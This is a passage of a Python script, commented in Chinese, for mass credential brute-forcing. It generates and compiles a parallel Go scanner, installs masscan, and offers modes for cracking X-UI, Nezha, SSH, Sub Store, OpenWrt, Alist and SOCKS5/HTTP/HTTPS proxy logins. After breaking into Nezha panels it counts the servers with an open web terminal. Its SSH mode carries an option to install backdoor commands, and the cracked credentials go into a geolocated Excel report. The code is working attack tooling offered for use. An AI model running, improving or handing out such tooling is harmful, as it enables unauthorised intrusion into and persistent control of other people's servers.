    "	if err != nil { return }",
    "	defer batch.Close()",
    "	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)",
    "	if err != nil { return }",
    "	defer outFile.Close()",
    "	tasks := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, outFile, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(batch)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" {",
    "			fields := strings.Fields(line)",
    "			if len(fields) > 0 {",
    "				tasks <- fields[0]",
    "			}",
    "		}",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "}",
]

# =========================== ipcx.py 内容 (增加tqdm风格进度条和批量查询) ===========================
IPCX_PY_CONTENT = r"""import requests
import time
import os
import re
import sys
import json
from openpyxl import Workbook, load_workbook
from openpyxl.utils import get_column_letter
from tqdm import tqdm

def adjust_column_width(ws):
    for col in ws.columns:
        max_length = 0
        column = col[0].column
        column_letter = get_column_letter(column)
        for cell in col:
            try:
                if cell.value:
                    length = len(str(cell.value))
                    if length > max_length:
                        max_length = length
            except:
                pass
        adjusted_width = max_length + 2
        ws.column_dimensions[column_letter].width = adjusted_width

def extract_ip_port(url):
    # 这个正则表达式旨在从各种URL格式中找到核心的ip:port或domain:port
    # 它可以处理 http://user:pass@ip:port/path -> ip:port
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/]+:\d+)', url)
    if match:
        return match.group(3)
    
    # 备用方案，用于简单的ip:port或domain:port
    match = re.search(r'([^:/\s]+:\d+)', url)
    if match:
        return match.group(1)
        
    # 如果行中没有端口，则备用方案仅用于ip/域
    match = re.search(r'(\w+://)?([^@/]+@)?([^:/\s]+)', url)
    if match:
        return match.group(3)

    return url.split()[0]

def get_ip_info_batch(ip_list, retries=3):
    # 批量查询ip-api.com，每次最多100个。
    url = "http://ip-api.com/batch?fields=country,regionName,city,isp,query,status"
    results = {}
    
    # 准备ip-api的有效负载，仅提取IP/域部分
    payload = []
    for ip_port in ip_list:
        ip = ip_port.split(':')[0]
        payload.append({"query": ip})

    for attempt in range(retries):
        try:
            response = requests.post(url, json=payload, timeout=20)
            response.raise_for_status()
            data = response.json()
            for item in data:
                # 从输入列表中找到与查询匹配的原始ip_port
                original_ip_port = next((ip for ip in ip_list if ip.startswith(item.get('query', ''))), None)
                if original_ip_port:
                    if item.get('status') == 'success':
                        results[original_ip_port] = [
                            original_ip_port,
                            item.get('country', 'N/A'),
                            item.get('regionName', 'N/A'),
                            item.get('city', 'N/A'),
                            item.get('isp', 'N/A')
                        ]
                    else:
                         results[original_ip_port] = [original_ip_port, '查询失败', '查询失败', '查询失败', '查询失败']
            # 填入原始列表中任何缺失的结果（例如，如果某些API调用失败）
            for ip_port in ip_list:
                if ip_port not in results:
                    results[ip_port] = [ip_port, 'N/A', 'N/A', 'N/A', 'N/A']
            # 按与输入列表相同的顺序返回结果
            return [results[ip_port] for ip_port in ip_list]
        except requests.exceptions.RequestException as e:
            if attempt < retries - 1:
                time.sleep(2)
            else:
                # 最终失败时，为批处理中的所有内容返回N/A
                return [[ip_port, '超时/错误', '超时/错误', '超时/错误', '超时/错误'] for ip_port in ip_list]
    
    # 如果循环完成但未返回，则备用
    return [[ip_port, 'N/A', 'N/A', 'N/A', 'N/A'] for ip_port in ip_list]

def process_ip_port_file(input_file, output_excel):
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    headers = ['原始地址', 'IP/域名:端口', '用户名', '密码', '国家', '地区', '城市', 'ISP']

    if os.path.exists(output_excel):
        try:
            os.remove(output_excel)
        except OSError as e:
            print(f"无法删除旧的Excel文件 '{output_excel}': {e}。请手动关闭它。")
            return

    wb = Workbook()
    ws = wb.active
    ws.title = "IP信息"
    ws.append(headers)
    wb.save(output_excel)

    # 准备批处理数据
    targets = []
    for line in lines:
        addr, user, passwd = line, '', ''
        try:
            # 优先匹配协议头，以正确处理包含@符号的用户名/密码
            proxy_match = re.match(r'(\w+://)(?:([^:]+):([^@]+)@)?(.+)', line)
            if proxy_match:
                # protocol = proxy_match.group(1) # http:// or https://
                user = proxy_match.group(2) or ''
                passwd = proxy_match.group(3) or ''
                addr = f"{proxy_match.group(1)}{proxy_match.group(4)}" # 重新组合地址部分
            else:
                # 如果没有协议头，使用空格分割
                parts = line.split()
                if len(parts) >= 3:
                    addr, user, passwd = parts[0], parts[1], parts[2]
                elif len(parts) == 2:
                    addr, user = parts[0], parts[1]
                else:
                    addr = parts[0]
        except Exception:
             addr = line.split()[0] if line.split() else ''
        
        ip_port = extract_ip_port(addr)
        if ip_port:
            targets.append({'line': line, 'ip_port': ip_port, 'user': user, 'passwd': passwd})

    # 分块处理
    chunk_size = 100  # ip-api.com 批处理限制
    
    with tqdm(total=len(targets), desc="IP信息查询", unit="ip", ncols=100) as pbar:
        for i in range(0, len(targets), chunk_size):
            chunk = targets[i:i+chunk_size]
            ip_ports_in_chunk = [target['ip_port'] for target in chunk]
            
            batch_results = get_ip_info_batch(ip_ports_in_chunk)
            
            wb = load_workbook(output_excel)
            ws = wb.active
            
            for original_target, result_data in zip(chunk, batch_results):
                row = [original_target['line'], result_data[0], original_target['user'], original_target['passwd']] + result_data[1:]
                ws.append(row)
            
            wb.save(output_excel)
            pbar.update(len(chunk))
            
            # ip-api.com 允许每分钟15个批处理请求。60/15 = 每个请求4秒。
            if i + chunk_size < len(targets):
                time.sleep(4.5)

    # 最后一次性调整宽度
    wb = load_workbook(output_excel)
    ws = wb.active
    adjust_column_width(ws)
    wb.save(output_excel)
    print("\nIP信息查询完成！")


if __name__ == "__main__":
    if len(sys.argv) > 2:
        process_ip_port_file(sys.argv[1], sys.argv[2])
    else:
        print("Usage: python ipcx.py <input_file> <output_file>")
"""

def generate_ipcx_py():
    """
    将存储在 IPCX_PY_CONTENT 变量中的内容写入到 ipcx.py 文件中。
    """
    with open('ipcx.py', 'w', encoding='utf-8') as f:
        f.write(IPCX_PY_CONTENT)

# =========================== 新增哪吒面板分析函数 ===========================
def debug_log(message, level="INFO"):
    colors = {
        "INFO": "\033[94m",
        "SUCCESS": "\033[92m",
        "WARNING": "\033[93m",
        "ERROR": "\033[91m",
        "ENDC": "\033[0m"
    }
    print(f"{colors.get(level, '')}[{level}] {message}{colors['ENDC']}")

def check_server_terminal_status(session, base_url, server_id):
    # 检测单台服务器的终端连接状态
    try:
        terminal_paths = [
            f"/dashboard/terminal/{server_id}", f"/dashboard/ssh/{server_id}",
            f"/dashboard/console/{server_id}", f"/dashboard/shell/{server_id}",
            f"/terminal/{server_id}", f"/ssh/{server_id}",
            f"/console/{server_id}", f"/shell/{server_id}"
        ]
        for path in terminal_paths:
            try:
                res = session.get(base_url + path, timeout=5, verify=False)
                if res.status_code == 200:
                    content = res.text.lower()
                    has_xterm = "xterm" in content
                    has_errors = any(error in content for error in [
                        "not found", "404", "error", "failed", "unavailable", "未找到", 
                        "错误", "失败", "不可用", "服务器不存在", "尚未连接", "terminal not available"
                    ])
                    if has_xterm and not has_errors:
                        return True
            except Exception:
                continue
        try:
            res = session.get(base_url + "/dashboard", timeout=5, verify=False)
            if res.status_code == 200:
                content = res.text.lower()
                if "xterm" in content and any(term in content for term in ["terminal", "ssh", "console", "shell"]):
                    return True
        except Exception:
            pass
    except Exception:
        return False
    return False

def count_terminal_accessible_servers(session, base_url):
    # 统计终端畅通的服务器数量
    try:
        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
        if res.status_code != 200:
            return 0, []
        
        data = res.json()
        servers = []
        
        if isinstance(data, dict) and "error" in data and "unauthorized" in data.get("error", "").lower():
            return check_terminal_status_via_pages(session, base_url)
        
        if isinstance(data, list):
            servers = data
        elif isinstance(data, dict) and "data" in data:
            servers = data["data"]
        
        if not servers:
            return 0, []
        
        count = 0
        accessible_servers = []
        for server in servers:
            if isinstance(server, dict) and "id" in server:
                server_id = server["id"]
                server_name = server.get("name", f"Server-{server_id}")
                if check_server_terminal_status(session, base_url, server_id):
                    count += 1
                    accessible_servers.append({"id": server_id, "name": server_name, "status": "终端畅通"})
        return count, accessible_servers
    except Exception:
        return 0, []

def check_terminal_status_via_pages(session, base_url):
    # API未授权时的备用检测方案
    try:
        res = session.get(base_url + "/dashboard", timeout=TIMEOUT, verify=False)
        if res.status_code == 200:
            content = res.text.lower()
            if "xterm" in content and any(term in content for term in ["terminal", "ssh", "console", "shell"]):
                return 1, [{"id": "unknown", "name": "Dashboard", "status": "终端畅通"}]
        return 0, []
    except Exception:
        return 0, []

def check_for_agents_and_terminal(session, base_url):
    # 检查机器数量和终端状态
    total_servers = 0
    try:
        res = session.get(base_url + "/api/v1/server", timeout=TIMEOUT, verify=False)
        if res.status_code == 200:
            data = res.json()
            if isinstance(data, list):
                total_servers = len(data)
            elif isinstance(data, dict) and "data" in data and isinstance(data["data"], list):
                total_servers = len(data["data"])
    except Exception:
        pass
    
    has_agents = total_servers > 0
    if not has_agents:
        return False, 0, 0, []
    
    terminal_accessible_count, terminal_accessible_servers = count_terminal_accessible_servers(session, base_url)
    return has_agents, terminal_accessible_count, total_servers, terminal_accessible_servers

def analyze_panel(result_line):
    # 多线程分析函数
    parts = result_line.split()
    if len(parts) < 3:
        return result_line, (0, 0, "格式错误")

    ip_port, username, password = parts[0], parts[1], parts[2]
    
    for protocol in ["http", "https"]:
        base_url = f"{protocol}://{ip_port}"
        session = requests.Session()
        login_url = base_url + "/api/v1/login"
        payload = {"username": username, "password": password}
        
        try:
            requests.packages.urllib3.disable_warnings()
            res = session.post(login_url, json=payload, timeout=TIMEOUT, verify=False)
            
            if res.status_code == 200:
                try:
                    j = res.json()
                    is_login_success = False
                    auth_token = None

                    if "token" in j.get("data", {}):
                        auth_token = j["data"]["token"]
                        is_login_success = True
                    if "nz-jwt" in res.headers.get("Set-Cookie", ""):
                        is_login_success = True
                    if j.get("code") == 200 and j.get("message", "").lower() == "success":
                        is_login_success = True

                    if is_login_success:
                        if auth_token:
                            session.headers.update({"Authorization": f"Bearer {auth_token}"})
                        
                        _, term_count, machine_count, term_servers = check_for_agents_and_terminal(session, base_url)
                        
                        server_names = [s.get('name', s.get('id', '')) for s in term_servers]
                        servers_string = ", ".join(map(str, server_names)) if server_names else "无"
                        
                        return result_line, (machine_count, term_count, servers_string)
                except json.JSONDecodeError:
                    if "oauth2" in res.text.lower():
                        return result_line, (0, 0, "登录页面")
                    return result_line, (0, 0, "分析失败")
                except Exception as e:
                    debug_log(f"分析时出错 {base_url}: {e}", "ERROR")
                    return result_line, (0, 0, "分析失败")
        except requests.exceptions.RequestException:
            continue
            
    return result_line, (0, 0, "登录失败")

# =========================== 主脚本优化部分 ===========================
# 定义Go可执行文件的绝对路径
GO_EXEC = "/usr/local/go/bin/go"

def update_excel_with_nezha_analysis(xlsx_file, analysis_data):
    # 将哪吒面板的分析结果更新到已生成的Excel文件中
    if not os.path.exists(xlsx_file):
        print(f"⚠️ Excel文件 {xlsx_file} 不存在，跳过更新。")
        return

    try:
        wb = load_workbook(xlsx_file)
        ws = wb.active

        # 添加新的表头
        server_count_col = ws.max_column + 1
        terminal_count_col = ws.max_column + 2
        terminal_list_col = ws.max_column + 3
        
        ws.cell(row=1, column=server_count_col, value="服务器总数")
        ws.cell(row=1, column=terminal_count_col, value="终端畅通数")
        ws.cell(row=1, column=terminal_list_col, value="畅通服务器列表")

        # 遍历每一行，更新数据
        for row_idx in range(2, ws.max_row + 1):
            original_address = ws.cell(row=row_idx, column=1).value
            if original_address in analysis_data:
                analysis_result = analysis_data[original_address]
                if len(analysis_result) == 3:
                    machine_count, term_count, servers_string = analysis_result
                    ws.cell(row=row_idx, column=server_count_col, value=machine_count)
                    ws.cell(row=row_idx, column=terminal_count_col, value=term_count)
                    ws.cell(row=row_idx, column=terminal_list_col, value=servers_string)
        
        wb.save(xlsx_file)
        print("✅ 成功将哪吒面板分析结果写入Excel报告。")
    except Exception as e:
        print(f"❌ 更新Excel文件时发生错误: {e}")


def input_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return int(user_input) if user_input.isdigit() else default

def input_filename_with_default(prompt, default):
    user_input = input(f"{prompt}（默认 {default}）：").strip()
    return user_input if user_input else default

def escape_go_string(s: str) -> str:
    return s.replace("\\", "\\\\").replace('"', '\\"')

def generate_go_code(template_lines, semaphore_size, usernames, passwords, timeout, **kwargs):
    user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
    pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
    
    code = "\n".join(template_lines)
    code = code.replace("{semaphore_size}", str(semaphore_size)) \
               .replace("{user_list}", user_list) \
               .replace("{pass_list}", pass_list) \
               .replace("{timeout}", str(timeout))

    # For SSH template
    if 'install_backdoor' in kwargs:
        backdoor_flag = "true" if kwargs['install_backdoor'] else "false"
        cmd_array = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('custom_cmds', [])]) + "}"
        code = code.replace("{enable_backdoor}", backdoor_flag) \
                   .replace("{custom_backdoor_cmds}", cmd_array)

    # For Proxy template
    if 'proxy_type' in kwargs:
        creds_list = "[]string{" + ", ".join([f'"{escape_go_string(line)}"' for line in kwargs.get('credentials', [])]) + "}"
        code = code.replace("{proxy_type}", kwargs['proxy_type']) \
                   .replace("{auth_mode}", str(kwargs.get('auth_mode', 0))) \
                   .replace("{creds_list}", creds_list)

    with open('xui.go', 'w', encoding='utf-8', errors='ignore') as f:
        f.write(code)


def compile_go_program():
    executable_name = "xui_executable"
    if sys.platform == "win32":
        executable_name += ".exe"

    print("--- 正在编译Go程序... ---")
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env:
        go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env:
        go_env['GOCACHE'] = '/tmp/.cache/go-build'

    try:
        # 添加 -ldflags "-s -w" 来减小编译后的文件体积
        process = subprocess.Popen(
            [GO_EXEC, 'build', '-ldflags', '-s -w', '-o', executable_name, 'xui.go'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=go_env
        )
        stdout, stderr = process.communicate()
        stdout = stdout.decode('utf-8', errors='ignore')
        stderr = stderr.decode('utf-8', errors='ignore')

        if process.returncode != 0:
            raise subprocess.CalledProcessError(process.returncode, [GO_EXEC, 'build', '-o', executable_name, 'xui.go'], stdout, stderr)
        
        if stderr:
            print("--- Go编译器警告 ---")
            print(stderr)
        print(f"--- Go程序编译成功: {executable_name} ---")
        return executable_name
    except subprocess.CalledProcessError as e:
        print("--- Go 程序编译失败 ---")
        print(f"返回码: {e.returncode}")
        print("--- 标准输出 ---")
        print(e.stdout)
        print("--- 错误输出 ---")
        print(e.stderr)
        print("--------------------------")
        print("编译失败，请检查Go环境和代码。")
        sys.exit(1)

def adjust_oom_score():
    if sys.platform != "linux":
        return
    
    try:
        pid = os.getpid()
        oom_score_adj_path = f"/proc/{pid}/oom_score_adj"
        if os.path.exists(oom_score_adj_path):
            with open(oom_score_adj_path, "w") as f:
                f.write("-500")
            print("✅ 成功调整OOM Score，降低被系统杀死的概率。")
    except PermissionError:
        print("⚠️  调整OOM Score失败：权限不足。建议使用root用户运行以获得最佳稳定性。")
    except Exception as e:
        print(f"⚠️  调整OOM Score时发生未知错误: {e}")

def check_and_manage_swap():
    if sys.platform != "linux":
        return

    try:
        swap_info = psutil.swap_memory()
        if swap_info.total > 0:
            print(f"✅ 检测到已存在的Swap空间，大小: {swap_info.total / 1024 / 1024:.2f} MiB。")
            return

        print("⚠️  警告：未检测到活动的Swap交换空间。在高负载下，这会极大地增加进程被系统杀死的风险。")
        choice = input("❓ 是否要创建一个2GB的临时Swap文件来提高稳定性？(y/N): ").strip().lower()
        
        if choice == 'y':
            swap_file = "/tmp/autoswap.img"
            print(f"--- 正在创建2GB Swap文件: {swap_file} (可能需要一些时间)... ---")
            
            if shutil.which("fallocate"):
                subprocess.run(["fallocate", "-l", "2G", swap_file], check=True)
            else:
                subprocess.run(["dd", "if=/dev/zero", f"of={swap_file}", "bs=1M", "count=2048"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            subprocess.run(["chmod", "600", swap_file], check=True)
            subprocess.run(["mkswap", swap_file], check=True)
            subprocess.run(["swapon", swap_file], check=True)
            
            atexit.register(cleanup_swap, swap_file)
            
            print(f"✅ 成功创建并启用了2GB Swap文件: {swap_file}")
            print("   该文件将在脚本退出时自动被禁用和删除。")

    except Exception as e:
        print(f"❌ Swap文件管理失败: {e}")
        print("   请检查权限或手动创建Swap。脚本将继续运行，但稳定性可能受影响。")

def cleanup_swap(swap_file):
    print(f"\n--- 正在禁用和清理临时Swap文件: {swap_file} ---")
    try:
        subprocess.run(["swapoff", swap_file], check=False)
        os.remove(swap_file)
        print("✅ 临时Swap文件已成功清理。")
    except Exception as e:
        print(f"⚠️ 清理Swap文件失败: {e}")

# ==================== 全新执行模型 ====================
def process_chunk(chunk_id, lines, executable_name, go_internal_concurrency):
    """
    处理单个IP块的函数，由Python的线程池调用。
    """
    input_file = os.path.join(TEMP_PART_DIR, f"input_{chunk_id}.txt")
    output_file = os.path.join(TEMP_XUI_DIR, f"output_{chunk_id}.txt")

    with open(input_file, 'w', encoding='utf-8') as f:
        f.write("\n".join(lines))

    try:
        # 为每个Go进程设置内存限制
        run_env = os.environ.copy()
        total_memory = psutil.virtual_memory().total
        mem_limit = int(total_memory * 0.70 / 1024 / 1024) # 70% of total RAM in MiB
        run_env["GOMEMLIMIT"] = f"{mem_limit}MiB"
        run_env["GOGC"] = "50" # 更积极的垃圾回收

        cmd = ['./' + executable_name, input_file, output_file]
        
        # ==================== 兼容性修复 ====================
        # 使用 stdout=PIPE 和 stderr=PIPE 代替 capture_output=True 和 text=True
        # 以兼容 Python 3.7 以下的版本
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=run_env)
        # =================================================

        if result.returncode != 0:
            # 手动将字节串解码为字符串
            stderr_str = result.stderr.decode('utf-8', 'ignore')
            if result.returncode == -9 or result.returncode == 137:
                 # OOM Killer
                 # 返回一个特殊错误，让主线程知道发生了什么
                 return (False, f"任务 {chunk_id} 被系统因内存不足而终止(OOM Killed)。")
            else:
                 # 其他错误
                 return (False, f"任务 {chunk_id} 失败，返回码 {result.returncode}。\n错误信息:\n{stderr_str}")
        
        return (True, None) # 成功
    finally:
        # 清理临时文件
        if os.path.exists(input_file):
            os.remove(input_file)
        # 输出文件保留，最后合并

def run_scan_in_parallel(lines, executable_name, python_concurrency, go_internal_concurrency, chunk_size):
    """
    使用Python线程池并发执行多个小的Go进程来完成扫描。
    """
    # 将所有IP分成小块
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    
    print(f"--- 已将 {len(lines)} 个目标分为 {len(chunks)} 个小任务块 ---")
    
    with ThreadPoolExecutor(max_workers=python_concurrency) as executor:
        # 提交所有任务
        future_to_chunk_id = {executor.submit(process_chunk, i, chunk, executable_name, go_internal_concurrency): i for i, chunk in enumerate(chunks)}
        
        # 使用tqdm显示总体进度
        with tqdm(total=len(chunks), desc="处理任务块") as pbar:
            for future in as_completed(future_to_chunk_id):
                chunk_id = future_to_chunk_id[future]
                try:
                    success, error_message = future.result()
                    if not success:
                        print(f"\n❌ {error_message}")
                        # 如果发生OOM，最好停止所有任务
                        if "OOM" in error_message:
                            print("检测到OOM错误，正在中止所有任务...")
                            executor.shutdown(wait=False, cancel_futures=True)
                            raise SystemExit("内存不足，脚本已中止。请使用更低的并发数重试。")
                except Exception as exc:
                    print(f'\n任务 {chunk_id} 执行时产生异常: {exc}')
                
                pbar.update(1)

# =======================================================

def merge_xui_files():
    merged_file = 'xui.txt' 
    if os.path.exists(merged_file):
        os.remove(merged_file)

    with open(merged_file, 'w', encoding='utf-8') as outfile:
        # 注意：现在输出文件名是 output_*.txt
        for f in sorted(os.listdir(TEMP_XUI_DIR)):
            if f.startswith("output_") and f.endswith(".txt"):
                with open(os.path.join(TEMP_XUI_DIR, f), 'r', encoding='utf-8') as infile:
                    shutil.copyfileobj(infile, outfile)

def merge_result_files(prefix: str, output_name: str, target_dir: str):
    output_path = output_name 
    if os.path.exists(output_path):
        os.remove(output_path)
    
    files_to_merge = [os.path.join(target_dir, name) for name in sorted(os.listdir(target_dir)) if name.startswith(prefix) and name.endswith(".txt")]
    if not files_to_merge:
        return

    with open(output_path, "w", encoding="utf-8") as out:
        for f_path in files_to_merge:
            with open(f_path, "r", encoding="utf-8") as f:
                shutil.copyfileobj(f, out)


def run_ipcx(final_result_file, xlsx_output_file):
    if os.path.exists(final_result_file) and os.path.getsize(final_result_file) > 0:
        print("\n--- 正在调用 ipcx.py 查询IP地理位置并生成Excel报告... ---")
        subprocess.run([sys.executable, 'ipcx.py', final_result_file, xlsx_output_file])

def clean_temp_files(template_mode):
    shutil.rmtree(TEMP_PART_DIR, ignore_errors=True)
    shutil.rmtree(TEMP_XUI_DIR, ignore_errors=True)
    if template_mode == 6: # 仅在SSH模式下清理
        shutil.rmtree(TEMP_HMSUCCESS_DIR, ignore_errors=True)
        shutil.rmtree(TEMP_HMFAIL_DIR, ignore_errors=True)

    for f in ['xui.go', 'ipcx.py', 'go.mod', 'go.sum', 'xui_executable', 'xui_executable.exe']: 
        if os.path.exists(f):
            try:
                os.remove(f)
            except OSError:
                pass

def choose_template_mode():
    print("请选择爆破模式：")
    print("1. XUI面板")
    print("2. 哪吒面板")
    print("3. SSH")
    print("4. Sub Store")
    print("5. OpenWrt/iStoreOS")
    print("--- 代理模式 ---")
    print("6. SOCKS5 代理")
    print("7. HTTP 代理")
    print("8. HTTPS 代理")
    print("--- 其他面板 ---")
    print("9. Alist 面板")
    while True:
        choice = input("输入 1-9 之间的数字（默认1）：").strip()
        if choice in ("", "1"): return 1
        elif choice == "2": return 2
        elif choice == "3": return 6
        elif choice == "4": return 7
        elif choice == "5": return 8
        elif choice == "6": return 9   # SOCKS5
        elif choice == "7": return 10  # HTTP
        elif choice == "8": return 11  # HTTPS
        elif choice == "9": return 12  # Alist
        else:
            print("输入无效，请重新输入。")

def check_environment(template_mode):
    import platform
    
    def run_cmd(cmd, check=True, quiet=False, extra_env=None):
        env = os.environ.copy()
        if extra_env:
            env.update(extra_env)
        
        stdout = subprocess.DEVNULL if quiet else None
        stderr = subprocess.DEVNULL if quiet else None
        try:
            subprocess.run(cmd, check=check, stdout=stdout, stderr=stderr, env=env)
        except subprocess.CalledProcessError as e:
            if check: raise e
        except FileNotFoundError:
            print(f"❌ 命令未找到: {cmd[0]}。请确保该命令在您的系统PATH中。")
            raise

    def is_in_china():
        print("\n    - 正在通过 ping google.com 检测网络环境...")
        try:
            result = subprocess.run(
                ["ping", "-c", "1", "-W", "2", "google.com"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=False 
            )
            if result.returncode == 0:
                print("    - ✅ Ping 成功，判断为海外服务器。")
                return False
            else:
                print("    - ⚠️ Ping 超时或失败，判断为国内服务器，将自动使用镜像。")
                return True
        except FileNotFoundError:
            print("    - ⚠️ 未找到 ping 命令，无法检测网络。将使用默认源。")
            return False
        except Exception:
            print("    - ⚠️ Ping 检测时发生未知错误，将使用默认源。")
            return False

    if platform.system().lower() == "windows":
        print(">>> 检测到 Windows 系统，跳过环境检测和依赖安装...\\n")
        try:
            import psutil, requests, openpyxl, yaml, tqdm
        except ImportError:
            print("⚠️ 检测到模块缺失，请在Windows上手动安装: pip install psutil requests openpyxl pyyaml tqdm colorama")
        return

    print(">>> 正在检查并安装依赖环境...")
    
    pkg_manager = ""
    if shutil.which("apt-get"):
        pkg_manager = "apt-get"
    elif shutil.which("yum"):
        pkg_manager = "yum"
    else:
        print("❌ 无法检测到 apt-get 或 yum。此脚本仅支持 Debian/Ubuntu 和 CentOS/RHEL 系列系统。")
        sys.exit(1)

    print(f"    - 检测到包管理器: {pkg_manager}")
    
    UPDATED = False
    def ensure_packages(pm, packages):
        nonlocal UPDATED
        sys.stdout.write(f"    - 正在使用 {pm} 检查系统包...")
        sys.stdout.flush()
        try:
            if not UPDATED and pm == "apt-get":
                run_cmd([pm, "update", "-y"], quiet=True)
                UPDATED = True
            
            install_cmd = [pm, "install", "-y"] + packages
            run_cmd(install_cmd, quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}")
            sys.exit(1)

    ping_package = "iputils" if pkg_manager == "yum" else "iputils-ping"
    ensure_packages(pkg_manager, ["curl", ping_package])
    
    in_china = is_in_china()
    
    if pkg_manager == "apt-get":
        ensure_packages("apt-get", ["python3-pip"])
    else: # yum
        run_cmd(["yum", "install", "-y", "epel-release"], quiet=True, check=False)
        ensure_packages("yum", ["python3-pip"])
        run_cmd(["alternatives", "--set", "python", "/usr/bin/python3"], check=False, quiet=True)

    sys.stdout.write("    - 正在使用 pip 安装 Python 模块...")
    sys.stdout.flush()
    try:
        pip_cmd = [sys.executable, "-m", "pip", "install"]
        if in_china:
            pip_cmd.extend(["-i", "https://pypi.tuna.tsinghua.edu.cn/simple"])
        pip_cmd.extend(["requests", "psutil", "openpyxl", "pyyaml", "tqdm", "colorama"])
        run_cmd(pip_cmd, quiet=True)
        print(" 完成")
    except Exception as e:
        print(f" 失败: {e}")
        sys.exit(1)

    ensure_packages(pkg_manager, ["ca-certificates", "tar", "masscan"])

    if pkg_manager == "apt-get":
        sys.stdout.write("    - 正在更新CA证书...")
        sys.stdout.flush()
        run_cmd(["update-ca-certificates"], quiet=True)
        print(" 完成")

    def get_go_version():
        if not os.path.exists(GO_EXEC): return None
        try:
            out = subprocess.check_output([GO_EXEC, "version"], stderr=subprocess.DEVNULL).decode()
            m = re.search(r"go(\d+)\.(\d+)", out)
            return (int(m.group(1)), int(m.group(2))) if m else None
        except:
            return None

    if not (get_go_version() and get_go_version() >= (1, 20)):
        print("--- Go环境不满足，正在自动安装... ---")
        if pkg_manager == "apt-get":
            run_cmd(["apt-get", "remove", "-y", "golang-go"], check=False, quiet=True) 
            run_cmd(["apt-get", "autoremove", "-y"], check=False, quiet=True)
        else: # yum
             run_cmd(["yum", "remove", "-y", "golang"], check=False, quiet=True)

        urls = ["https://studygolang.com/dl/golang/go1.22.1.linux-amd64.tar.gz", "https://go.dev/dl/go1.22.1.linux-amd64.tar.gz"]
        if not in_china:
            urls.reverse() # 如果不在中国，优先使用go.dev

        GO_TAR_PATH = "/tmp/go.tar.gz"
        download_success = False
        for url in urls:
            print(f"    - 正在从 {url.split('/')[2]} 下载Go...")
            try:
                subprocess.run(["curl", "-#", "-Lo", GO_TAR_PATH, url], check=True)
                download_success = True
                break
            except Exception:
                print(f"      下载失败，尝试下一个源...")
        
        if not download_success:
            print("❌ Go安装包下载失败，请检查网络。")
            sys.exit(1)

        sys.stdout.write("    - 正在解压Go安装包...")
        sys.stdout.flush()
        try:
            run_cmd(["rm", "-rf", "/usr/local/go"], quiet=True)
            run_cmd(["tar", "-C", "/usr/local", "-xzf", GO_TAR_PATH], quiet=True)
            print(" 完成")
        except Exception as e:
            print(f" 失败: {e}")
            sys.exit(1)

        os.environ["PATH"] = "/usr/local/go/bin:" + os.environ["PATH"]
    
    go_env = os.environ.copy()
    if 'HOME' not in go_env: go_env['HOME'] = '/tmp'
    if 'GOCACHE' not in go_env: go_env['GOCACHE'] = '/tmp/.cache/go-build'
    if in_china:
        go_env['GOPROXY'] = 'https://goproxy.cn,direct'

    if not os.path.exists("go.mod"):
        run_cmd([GO_EXEC, "mod", "init", "xui"], quiet=True, extra_env=go_env)

    required_pkgs = []
    if template_mode == 6: # SSH
        required_pkgs.append("golang.org/x/crypto/ssh")
    if template_mode in [9, 10, 11]: # 代理模式
        required_pkgs.append("golang.org/x/net/proxy")

    if required_pkgs:
        sys.stdout.write("    - 正在安装Go模块...")
        sys.stdout.flush()
        for pkg in required_pkgs:
            try:
                run_cmd([GO_EXEC, "get", pkg], quiet=True, extra_env=go_env)
            except subprocess.CalledProcessError as e:
                print(f"\n❌ Go模块 '{pkg}' 安装失败。请检查网络或代理设置。")
                raise e 
        print(" 完成")

    print(">>> 环境依赖检测完成 ✅\\n")

def load_credentials(template_mode, auth_mode=0):
    usernames, passwords, credentials = [], [], []
    
    if template_mode == 7: # Sub Store 模式
        usernames, passwords = ["2cXaAxRGfddmGz2yx1wA"], ["2cXaAxRGfddmGz2yx1wA"]
        return usernames, passwords, credentials
    
    if template_mode == 12: # Alist 模式不需要凭据
        return [], [], []

    if auth_mode == 1: # 无凭据
        return [], [], []
    
    if auth_mode == 2: # 用户/密码文件
        if not os.path.exists("username.txt") or not os.path.exists("password.txt"):
            print("❌ 错误: 缺少 username.txt 或 password.txt 文件。")
            sys.exit(1)
        with open("username.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open("password.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        if not usernames or not passwords:
            print("❌ 错误: 用户名或密码文件为空。")
            sys.exit(1)
        return usernames, passwords, credentials

    if auth_mode == 3: # 凭据文件
        if not os.path.exists("credentials.txt"):
            print("❌ 错误: 缺少 credentials.txt 文件。")
            sys.exit(1)
        with open("credentials.txt", 'r', encoding='utf-8-sig', errors='ignore') as f:
            credentials = [line.strip() for line in f if line.strip() and ":" in line]
        if not credentials:
            print("❌ 错误: credentials.txt 文件为空或格式不正确。")
            sys.exit(1)
        return usernames, passwords, credentials

    # 非代理模式的默认逻辑
